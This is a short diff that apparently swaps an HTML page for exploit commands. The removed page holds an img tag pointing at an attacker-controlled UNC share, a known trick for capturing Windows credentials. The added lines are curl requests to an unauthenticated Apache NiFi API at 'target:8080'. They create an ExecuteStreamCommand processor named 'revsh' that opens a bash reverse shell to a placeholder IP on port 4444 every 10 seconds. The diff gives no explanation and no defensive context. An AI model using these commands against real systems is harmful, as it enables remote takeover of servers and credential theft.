@@ -1,5 +1,19 @@
-<html>
-  <body>
-    <img src="\\<your-ip>\share\icon.jpg" />
-  </body>
-</html>
+curl -s http://target:8080/nifi-api/process-groups/root | jq '.id'
+curl -X POST http://target:8080/nifi-api/process-groups/<PG_ID>/processors \
+-H 'Content-Type: application/json' \
+-d '{
+  "component": {
+    "type": "org.apache.nifi.processors.standard.ExecuteStreamCommand",
+    "name": "revsh",
+    "config": {
+      "properties": {
+        "Command": "/bin/bash",
+        "Command Arguments": "-c \"bash -i >& /dev/tcp/192.168.XXX.XXX/4444 0>&1\"",
+        "Batch Duration": "0 sec"
+      },
+      "schedulingPeriod": "10 sec",
+      "autoTerminatedRelationships": ["success"]
+    }
+  },
+  "revision": {"version": 0}
+}'
